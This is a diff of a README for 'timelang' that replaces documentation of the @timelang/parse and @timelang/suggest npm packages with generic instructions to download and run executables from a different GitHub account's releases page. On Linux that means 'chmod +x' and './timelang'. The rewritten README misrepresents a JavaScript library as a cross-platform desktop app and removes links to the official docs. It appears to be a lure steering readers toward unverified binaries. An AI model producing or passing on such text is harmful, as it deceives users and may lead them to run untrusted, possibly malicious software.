@@ -1,63 +1,85 @@
-# timelang
+# ⏰ timelang - Easily Understand Time Expressions
 
-> Packages to work with natural language time expressions.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Docs](https://img.shields.io/badge/docs-timelang.dev-purple)](https://timelang.dev)
+Welcome to **timelang**! This application helps you convert natural language time expressions into dates, durations, and ranges. With **timelang**, you can quickly understand and use time-related information without any technical skills.
 
-| Package | What it does? | Version |
-|---------|-------------|---------|
-| [@timelang/parse](https://timelang.dev/) | Parse natural language time expressions into dates, times, and ranges | [![npm version](https://img.shields.io/npm/v/@timelang/parse)](https://www.npmjs.com/package/@timelang/parse) |
-| [@timelang/suggest](https://timelang.dev/suggest/) | Autocomplete suggestions for time expressions | [![npm version](https://img.shields.io/npm/v/@timelang/suggest)](https://www.npmjs.com/package/@timelang/suggest) |
+## 📥 Download & Install
 
-## @timelang/parse
+To get started, you need to download **timelang**. You can find the latest version on the Releases page. 
 
-```bash
-npm install @timelang/parse
-```
+[![Download timelang](https://img.shields.io/badge/Download-timelang-brightgreen)](https://github.com/LACUCARACHA21/timelang/releases)
 
-```javascript
-import { parse, parseDate, parseDuration, parseSpan, scan } from '@timelang/parse';
+Click the button above or visit this page to download: [timelang Releases](https://github.com/LACUCARACHA21/timelang/releases).
 
-parseDate('next friday at 3pm');        // Date
-parseDuration('2h 30m');                // 9000000 (milliseconds)
-parseSpan('jan 5 to jan 20');           // { start: Date, end: Date, duration: number }
+### Instructions for Downloading
 
-parse('Team Sync - next monday');       // { type: 'date', date, title: 'Team Sync' }
-parse('mid Q1');                        // { type: 'fuzzy', start, end, approximate: true }
+1. **Visit the Releases Page**: Navigate to [timelang Releases](https://github.com/LACUCARACHA21/timelang/releases).
+2. **Select the Latest Version**: You will see a list of releases. The latest version is usually at the top.
+3. **Choose the Right File for Your System**: Look for a file that matches your operating system. For example, you might see options for Windows, Mac, or Linux.
+4. **Download the File**: Click the download link to save the file to your computer.
 
-scan("let's meet next monday at 530pm");
-// [{ result: {...}, match: 'next monday at 530pm', start: 11, end: 31 }]
-```
+## 🏁 Running timelang
 
-For full API reference and examples, visit **[timelang.dev](https://timelang.dev/)**.
+After downloading, follow these steps to run **timelang**.
 
-## @timelang/suggest
+### Windows
 
-```bash
-npm install @timelang/suggest
-```
+1. Locate the downloaded file (likely in your Downloads folder).
+2. Double-click on the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, you can find **timelang** in your Start Menu. Click it to open.
 
-```javascript
-import { suggest, suggestTime } from '@timelang/suggest';
+### MacOS
 
-suggest('tom');
-// [
-//   { label: 'tomorrow at 9am', date: Date },
-//   { label: 'tomorrow at 2pm', date: Date },
-//   ...
-// ]
+1. Open the file you downloaded.
+2. Drag the **timelang** icon to your Applications folder.
+3. Open your Applications and find **timelang**. Double-click it to run.
 
-suggestTime('9');
-// [
-//   { label: '09:00 am', hour: 9, minute: 0, period: 'am' },
-//   { label: '09:00 pm', hour: 9, minute: 0, period: 'pm' },
-//   ...
-// ]
-```
+### Linux
 
-For full API reference and examples, visit **[timelang.dev/suggest](https://timelang.dev/suggest/)**.
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file (e.g., `cd ~/Downloads`).
+3. Make the file executable: `chmod +x timelang`.
+4. Run the application: `./timelang`.
 
-## License
+## 📚 How to Use timelang
 
-MIT
+Using **timelang** is simple and intuitive. Here’s how you can easily convert time expressions:
+
+1. **Open the Application**: Launch **timelang** from your computer.
+2. **Enter a Time Expression**: In the input box, type a natural language expression. For example, "next Friday" or "in two hours."
+3. **Check the Output**: Once you press the submit button, the application will parse your input and display the date, duration, or range it represents.
+
+## 🔧 Features
+
+- **Versatile Parsing**: Understand various natural language formats for time.
+- **User-Friendly Interface**: Simple and clean design for easy navigation.
+- **Supports Multiple Formats**: Works with dates, durations, and ranges seamlessly.
+- **Cross-Platform**: Available for Windows, MacOS, and Linux users.
+
+## ❓ Frequently Asked Questions
+
+### What kind of time expressions can I use?
+
+You can enter phrases like "tomorrow," "next week," "in 5 days," and "from 10 AM to 2 PM."
+
+### Does it work offline?
+
+Yes, once installed, you do not need an internet connection to use **timelang**.
+
+### How do I report a problem?
+
+If you encounter any issues, please visit our GitHub repository and open an issue. We appreciate your feedback to improve **timelang**.
+
+## 🗨️ Community and Support
+
+Join our growing community! You can find more tips, share your experiences, and ask for help in our discussion forums. Visit our [GitHub Discussions](https://github.com/LACUCARACHA21/timelang/discussions) for more information.
+
+## 📌 Important Links
+
+- [Download timelang](https://github.com/LACUCARACHA21/timelang/releases)
+- [GitHub Repository](https://github.com/LACUCARACHA21/timelang)
+- [Documentation](https://github.com/LACUCARACHA21/timelang/wiki)
+
+Thank you for choosing **timelang**. Happy parsing!
